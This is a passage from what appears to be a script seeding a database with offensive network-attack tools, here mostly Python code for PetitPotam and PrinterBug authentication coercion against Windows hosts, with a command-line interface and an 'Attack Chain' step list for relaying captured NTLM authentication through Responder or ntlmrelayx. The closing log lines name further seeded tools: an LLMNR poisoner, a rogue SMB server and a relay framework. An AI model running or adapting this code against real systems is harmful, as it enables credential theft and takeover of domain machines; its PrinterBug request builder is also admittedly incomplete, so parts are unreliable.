        print(f"[*] Triggering EfsRpcDecryptFileSrv...")

        unc_path = f"\\\\\\\\{self.listener}\\\\share\\\\file.txt"
        request = self._build_decrypt_file_request(unc_path)

        try:
            self.dce.call(5, request)
            return True
        except:
            return False

    def _build_open_file_raw_request(self, path: str) -> bytes:
        """Build EfsRpcOpenFileRaw request"""

        # EFSRPC_OPEN_FILE_RAW structure
        request = bytearray()

        # FileName (Unicode string with null terminator)
        filename = path.encode('utf-16-le') + b'\\x00\\x00'

        # MaxLength, Length, Offset
        request += struct.pack('<I', len(filename))
        request += struct.pack('<I', 0)  # Offset
        request += struct.pack('<I', len(filename))

        # Actual string data
        request += filename

        # Flags
        request += struct.pack('<I', 0)

        return bytes(request)

    def _build_encrypt_file_request(self, path: str) -> bytes:
        """Build EfsRpcEncryptFileSrv request"""

        request = bytearray()

        filename = path.encode('utf-16-le') + b'\\x00\\x00'

        # RPC_UNICODE_STRING
        request += struct.pack('<I', len(filename))
        request += struct.pack('<I', 0)
        request += struct.pack('<I', len(filename))
        request += filename

        return bytes(request)

    def _build_decrypt_file_request(self, path: str) -> bytes:
        """Build EfsRpcDecryptFileSrv request"""
        return self._build_encrypt_file_request(path)

    def try_all_methods(self) -> bool:
        """Try all coercion methods"""

        methods = [
            ('EfsRpcOpenFileRaw', self.coerce_efs_rpc_open_file_raw),
            ('EfsRpcEncryptFileSrv', self.coerce_efs_rpc_encrypt_file_srv),
            ('EfsRpcDecryptFileSrv', self.coerce_efs_rpc_decrypt_file_srv),
        ]

        for name, method in methods:
            try:
                if method():
                    print(f"[+] {name} succeeded")
                    return True
            except:
                continue

        return False

    def try_all_pipes(self, username: str = '', password: str = '',
                      domain: str = '') -> bool:
        """Try all named pipes"""

        for pipe in self.PIPES:
            print(f"[*] Trying pipe: {pipe}")

            if self.connect(username, password, domain, pipe):
                if self.try_all_methods():
                    return True

        return False


class PrinterBug:
    """
    MS-RPRN PrinterBug / SpoolSample
    Coerce via Print Spooler
    """

    RPRN_UUID = ('12345678-1234-abcd-ef00-0123456789ab', '1.0')

    def __init__(self, target: str, listener: str):
        self.target = target
        self.listener = listener
        self.dce = None

    def connect(self, username: str, password: str, domain: str) -> bool:
        """Connect to spoolss pipe"""

        string_binding = f"ncacn_np:{self.target}[\\\\pipe\\\\spoolss]"

        try:
            rpc_transport = transport.DCERPCTransportFactory(string_binding)
            rpc_transport.set_credentials(username, password, domain)

            self.dce = rpc_transport.get_dce_rpc()
            self.dce.connect()
            self.dce.bind(uuidtup_to_bin(self.RPRN_UUID))

            return True
        except Exception as e:
            print(f"[-] Connection failed: {e}")
            return False

    def coerce(self) -> bool:
        """Trigger RpcRemoteFindFirstPrinterChangeNotificationEx"""

        print(f"[*] Triggering Printer Bug...")

        # Build request
        # RpcRemoteFindFirstPrinterChangeNotificationEx
        # Opnum: 65

        listener_path = f"\\\\\\\\{self.listener}"

        request = self._build_request(listener_path)

        try:
            self.dce.call(65, request)
            print("[+] Coercion triggered!")
            return True
        except:
            return False

    def _build_request(self, path: str) -> bytes:
        """Build RpcRemoteFindFirstPrinterChangeNotificationEx request"""

        # Simplified - actual implementation needs proper NDR encoding
        return path.encode('utf-16-le')


def main():
    import argparse

    parser = argparse.ArgumentParser(description='Authentication Coercion')
    parser.add_argument('-t', '--target', required=True, help='Target host')
    parser.add_argument('-l', '--listener', required=True, help='Listener IP')
    parser.add_argument('-u', '--username', default='')
    parser.add_argument('-p', '--password', default='')
    parser.add_argument('-d', '--domain', default='')
    parser.add_argument('-m', '--method', default='petitpotam',
                        choices=['petitpotam', 'printerbug', 'all'])

    args = parser.parse_args()

    if args.method == 'petitpotam' or args.method == 'all':
        print(f"\\n[*] PetitPotam: {args.target} -> {args.listener}")
        petit = PetitPotam(args.target, args.listener)
        petit.try_all_pipes(args.username, args.password, args.domain)

    if args.method == 'printerbug' or args.method == 'all':
        print(f"\\n[*] PrinterBug: {args.target} -> {args.listener}")
        printer = PrinterBug(args.target, args.listener)
        if printer.connect(args.username, args.password, args.domain):
            printer.coerce()


if __name__ == '__main__':
    main()
\`\`\`

### Attack Chain
1. Start Responder or ntlmrelayx on listener
2. Run coercion against target
3. Capture/relay the authentication
4. Profit!
`, 0, now);

console.log('Seeded: Network Attack Tools');
console.log('  - LLMNR/NBT-NS/mDNS Poisoner');
console.log('  - Rogue SMB Server');
console.log('  - NTLM Relay Framework');
console.log('  - PetitPotam / PrinterBug');
